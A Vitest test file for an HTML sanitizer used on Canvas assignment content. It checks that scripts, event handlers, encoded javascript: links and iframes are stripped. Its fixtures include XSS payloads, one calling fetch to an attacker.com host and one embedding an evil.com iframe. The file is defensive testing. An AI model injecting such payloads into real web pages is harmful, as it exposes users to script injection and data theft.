import { describe, it, expect } from 'vitest';
import { sanitizeHtml, sanitizeAssignment, sanitizeCanvasAssignment } from './sanitize';

describe('sanitizeHtml', () => {
  it('strips script tags and executable content', () => {
    const malicious = '<p>Hello</p><script>alert("xss")</script><span>World</span>';
    const clean = sanitizeHtml(malicious);
    expect(clean).not.toContain('<script');
    expect(clean).not.toContain('alert');
    expect(clean).toContain('<p>Hello</p>');
    expect(clean).toContain('<span>World</span>');
  });

  it('strips inline event handlers like onerror, onload, onclick', () => {
    const malicious = '<img src="invalid.jpg" onerror="alert(1)" onload="fetch(\'http://attacker.com\')"/>';
    const clean = sanitizeHtml(malicious);
    expect(clean).not.toContain('onerror');
    expect(clean).not.toContain('onload');
    expect(clean).not.toContain('alert');
  });

  it('strips javascript: URLs in href attributes even when entity-encoded or spaced', () => {
    const malicious = '<a href="java&#x73;cript:alert(1)">Click Me</a>';
    const clean = sanitizeHtml(malicious);
    expect(clean).not.toContain('href=');
    expect(clean).not.toContain('javascript:');
    expect(clean).toContain('Click Me');
  });

  it('removes iframe and object tags', () => {
    const malicious = '<iframe src="https://evil.com"></iframe><object data="test.swf"></object>';
    const clean = sanitizeHtml(malicious);
    expect(clean).not.toContain('<iframe');
    expect(clean).not.toContain('<object');
  });

  it('preserves safe formatting HTML elements', () => {
    const safe = '<h3>Title</h3><p>This is a <b>description</b> with a <a href="https://canvas.instructure.com">link</a>.</p>';
    const clean = sanitizeHtml(safe);
    expect(clean).toContain('<h3>Title</h3>');
    expect(clean).toContain('<b>description</b>');
    expect(clean).toContain('href="https://canvas.instructure.com"');
  });

  it('handles empty or non-string inputs safely', () => {
    expect(sanitizeHtml('')).toBe('');
    expect(sanitizeHtml(null as any)).toBe('');
    expect(sanitizeHtml(undefined as any)).toBe('');
  });
});

describe('sanitizeAssignment & sanitizeCanvasAssignment', () => {
  it('normalizes invalid objects without crashing', () => {
    expect(sanitizeAssignment(null)).toBeNull();
    expect(sanitizeCanvasAssignment(undefined)).toBeNull();
  });
});
